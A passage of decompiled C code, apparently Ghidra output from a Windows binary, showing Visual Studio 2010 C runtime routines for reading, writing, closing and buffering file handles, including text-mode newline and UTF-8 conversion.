          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00420450;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00423840)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_00423834 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    FUN_0040c664();
    return -1;
  }
  piVar6 = &DAT_00423840 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + 4 + iVar14);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_0040e11a;
  }
  if (_MaxCharCount < 0x80000000) {
    local_10 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + 0x24 + iVar14) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_0040e108;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        psVar12 = (short *)__malloc_crt(_MaxCharCount);
        local_14 = psVar12;
        if (psVar12 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_0040e108;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_14 = (short *)_DstBuf;
        psVar12 = (short *)_DstBuf;
      }
      psVar8 = psVar12;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        uVar7 = _MaxCharCount - 1;
        *(char *)psVar12 = cVar4;
        psVar8 = (short *)((int)psVar12 + 1);
        local_10 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = psVar12 + 1;
          uVar7 = _MaxCharCount - 2;
          local_10 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)psVar12 + 3);
            local_10 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_0040e427;
          }
          goto LAB_0040e41c;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_10 = (short *)((int)local_10 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_0040e427;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*psVar12 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_10 = (short *)((int)local_10 + (int)local_14);
          _MaxCharCount = (uint)local_14;
          psVar12 = local_14;
          if (local_14 < local_10) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar12 = *(short *)_MaxCharCount;
                  psVar12 = psVar12 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_10 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_0040e4c7;
                  }
LAB_0040e55a:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_0040e55c:
                  *psVar12 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_0040e55a;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar12 == local_14) && (local_c == 10)) goto LAB_0040e4c7;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_0040e563;
                    goto LAB_0040e55a;
                  }
                  if (local_c == 10) {
LAB_0040e4c7:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_0040e55c;
                  }
                  *psVar12 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar12 = psVar12 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar12 = sVar17;
                psVar12 = psVar12 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_0040e563:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_10);
          }
          local_10 = (short *)((int)psVar12 - (int)local_14);
          goto LAB_0040e427;
        }
        if ((local_1c == 0) || (*(char *)psVar12 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_10 = (short *)((int)local_10 + (int)local_14);
        _MaxCharCount = (uint)local_14;
        psVar12 = local_14;
        if (local_14 < local_10) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar12 = *(undefined *)_MaxCharCount;
                psVar12 = (short *)((int)psVar12 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_10 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_0040e2a7;
                }
LAB_0040e31e:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar12 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_0040e31e;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar12 == local_14) && (local_5 == '\n')) goto LAB_0040e2a7;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_0040e322;
                  goto LAB_0040e31e;
                }
                if (local_5 == '\n') {
LAB_0040e2a7:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar12 = 10;
                }
                else {
                  *(undefined *)psVar12 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar12 = (short *)((int)psVar12 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar12 = cVar4;
              psVar12 = (short *)((int)psVar12 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_0040e322:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_10);
        }
        local_10 = (short *)((int)psVar12 - (int)local_14);
        if ((local_6 != '\x01') || (local_10 == (short *)0x0)) goto LAB_0040e427;
        bVar3 = *(byte *)(short *)((int)psVar12 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar12 = (short *)((int)psVar12 + -1);
          while ((((&DAT_00420490)[bVar3] == '\0' && (iVar13 < 5)) && (local_14 <= psVar12))) {
            psVar12 = (short *)((int)psVar12 + -1);
            bVar3 = *(byte *)psVar12;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_00420490)[*(byte *)psVar12] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_0040e423;
          }
          if ((char)(&DAT_00420490)[*(byte *)psVar12] + 1 == iVar13) {
            psVar12 = (short *)((int)psVar12 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + 4 + iVar14) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar8 = (short *)((int)psVar12 + 1);
            *(byte *)(*piVar6 + 5 + iVar14) = *(byte *)psVar12;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar8;
              psVar8 = psVar12 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar8;
              psVar8 = (short *)((int)psVar8 + 1);
            }
            psVar12 = (short *)((int)psVar8 - iVar13);
          }
        }
        iVar13 = (int)psVar12 - (int)local_14;
        local_10 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_14,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_10 != (short *)0x0) {
          bVar15 = local_10 != (short *)iVar13;
          local_10 = (short *)((int)local_10 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_0040e427;
        }
        uVar11 = GetLastError();
LAB_0040e41c:
        __dosmaperr(uVar11);
      }
LAB_0040e423:
      local_18 = -1;
LAB_0040e427:
      if (local_14 != (short *)_DstBuf) {
        _free(local_14);
      }
      if (local_18 == -2) {
        return (int)local_10;
      }
      return local_18;
    }
  }
LAB_0040e108:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_0040e11a:
  FUN_0040c664();
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2010 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_0040e6c0();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_0040e620;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0040e620:
  FUN_0040c664();
  return -1;
}



void FUN_0040e6c0(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0x7f < _Size)) && (DAT_00423830 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_00423840 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_00423840 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_0040e7b0;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0040e7b2;
    }
  }
LAB_0040e7b0:
  DVar4 = 0;
LAB_0040e7b2:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_00423840)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2010 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_0040e8a2();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_0040c664();
  }
  return -1;
}



void FUN_0040e8a2(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2010 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040e901:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_0040e901;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_0040d0c1(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_0040d0c1(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_00420450;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_00423840)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_0040ea29;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_0040ea29:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  char cVar1;
  WCHAR WVar2;
  wchar_t *pwVar3;
  wint_t wVar4;
  ulong *puVar5;
  int *piVar6;
  int iVar7;
  _ptiddata p_Var8;
  BOOL BVar9;
  DWORD nNumberOfBytesToWrite;
  WCHAR *pWVar10;
  int iVar11;
  uint uVar12;
  int unaff_EBX;
  WCHAR *pWVar13;
  uint uVar14;
  int iVar15;
  ushort uVar16;
  uint local_1ae8;
  WCHAR *local_1ae4;
  int *local_1ae0;
  uint local_1adc;
  WCHAR *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  uint local_1acc;
  char local_1ac5;
  uint local_1ac4;
  DWORD local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined local_10;
  char local_f;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = 0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0040f12e;
  if (_Buf == (void *)0x0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_0040c664();
    goto LAB_0040f12e;
  }
  piVar6 = &DAT_00423840 + (_FileHandle >> 5);
  iVar11 = (_FileHandle & 0x1fU) * 0x40;
  local_1ac5 = (char)(*(char *)(*piVar6 + 0x24 + iVar11) * '\x02') >> 1;
  local_1ae0 = piVar6;
  if (((local_1ac5 == '\x02') || (local_1ac5 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_0040c664();
    goto LAB_0040f12e;
  }
  if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EBX);
  }
  iVar7 = __isatty(_FileHandle);
  if ((iVar7 == 0) || ((*(byte *)(iVar11 + 4 + *piVar6) & 0x80) == 0)) {
LAB_0040edbf:
    if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x80) == 0) {
      BVar9 = WriteFile(*(HANDLE *)(*piVar6 + iVar11),local_1ad0,_MaxCharCount,&local_1adc,
                        (LPOVERLAPPED)0x0);
      if (BVar9 == 0) {
LAB_0040f0a0:
        local_1ac0 = GetLastError();
      }
      else {
        local_1ac0 = 0;
        local_1acc = local_1adc;
      }
LAB_0040f0ac:
      if (local_1acc != 0) goto LAB_0040f12e;
      goto LAB_0040f0b5;
    }
    local_1ac0 = 0;
    if (local_1ac5 == '\0') {
      pWVar13 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_0040f0eb;
      do {
        uVar14 = 0;
        uVar12 = (int)pWVar13 - (int)local_1ad0;
        pWVar10 = local_1abc;
        do {
          if (_MaxCharCount <= uVar12) break;
          cVar1 = *(char *)pWVar13;
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          uVar12 = uVar12 + 1;
          if (cVar1 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar10 = '\r';
            pWVar10 = (WCHAR *)((int)pWVar10 + 1);
            uVar14 = uVar14 + 1;
          }
          *(char *)pWVar10 = cVar1;
          pWVar10 = (WCHAR *)((int)pWVar10 + 1);
          uVar14 = uVar14 + 1;
          local_1ae4 = pWVar13;
        } while (uVar14 < 0x13ff);
        BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                          (int)pWVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
        if (BVar9 == 0) goto LAB_0040f0a0;
        local_1acc = local_1acc + local_1adc;
      } while (((int)pWVar10 - (int)local_1abc <= (int)local_1adc) &&
              ((uint)((int)pWVar13 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_0040f0ac;
    }
    if (local_1ac5 == '\x02') {
      pWVar13 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)pWVar13 - (int)local_1ad0;
          pWVar10 = local_1abc;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar2 = *pWVar13;
            pWVar13 = pWVar13 + 1;
            uVar12 = uVar12 + 2;
            if (WVar2 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar10 = L'\r';
              pWVar10 = pWVar10 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *pWVar10 = WVar2;
            pWVar10 = pWVar10 + 1;
            local_1ae4 = pWVar13;
          } while (local_1ac4 < 0x13fe);
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                            (int)pWVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_0040f0a0;
          local_1acc = local_1acc + local_1adc;
        } while (((int)pWVar10 - (int)local_1abc <= (int)local_1adc) &&
                ((uint)((int)pWVar13 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_0040f0ac;
      }
    }
    else {
      local_1ad8 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)local_1ad8 - (int)local_1ad0;
          pWVar13 = local_6bc;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar2 = *local_1ad8;
            local_1ad8 = local_1ad8 + 1;
            uVar12 = uVar12 + 2;
            if (WVar2 == L'\n') {
              *pWVar13 = L'\r';
              pWVar13 = pWVar13 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *pWVar13 = WVar2;
            pWVar13 = pWVar13 + 1;
          } while (local_1ac4 < 0x6a8);
          iVar15 = 0;
          iVar7 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar13 - (int)local_6bc) / 2,
                                      local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar7 == 0) goto LAB_0040f0a0;
          do {
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1414 + iVar15,iVar7 - iVar15,
                              &local_1adc,(LPOVERLAPPED)0x0);
            if (BVar9 == 0) {
              local_1ac0 = GetLastError();
              break;
            }
            iVar15 = iVar15 + local_1adc;
          } while (iVar15 < iVar7);
        } while ((iVar7 <= iVar15) &&
                (local_1acc = (int)local_1ad8 - (int)local_1ad0, local_1acc < _MaxCharCount));
        goto LAB_0040f0ac;
      }
    }
  }
  else {
    p_Var8 = __getptd();
    pwVar3 = p_Var8->ptlocinfo->lc_category[0].wlocale;
    BVar9 = GetConsoleMode(*(HANDLE *)(iVar11 + *piVar6),(LPDWORD)&local_1ae4);
    if ((BVar9 == 0) || ((pwVar3 == (wchar_t *)0x0 && (local_1ac5 == '\0')))) goto LAB_0040edbf;
    local_1ae4 = (WCHAR *)GetConsoleCP();
    local_1ad8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac4 = 0;
      pWVar13 = local_1ad0;
      do {
        piVar6 = local_1ae0;
        if (local_1ac5 == '\0') {
          cVar1 = *(char *)pWVar13;
          local_1ae8 = (uint)(cVar1 == '\n');
          iVar7 = *local_1ae0 + iVar11;
          if (*(int *)(iVar7 + 0x38) == 0) {
            iVar7 = _isleadbyte(CONCAT22(cVar1 >> 7,(short)cVar1));
            if (iVar7 == 0) {
              uVar16 = 1;
              pWVar10 = pWVar13;
              goto LAB_0040ec26;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar13)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar11 + 0x34 + *piVar6) = *(undefined *)pWVar13;
              *(undefined4 *)(iVar11 + 0x38 + *piVar6) = 1;
              break;
            }
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)pWVar13,2);
            if (iVar7 == -1) break;
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_1ac4 = local_1ac4 + 1;
          }
          else {
            local_10 = *(undefined *)(iVar7 + 0x34);
            *(undefined4 *)(iVar7 + 0x38) = 0;
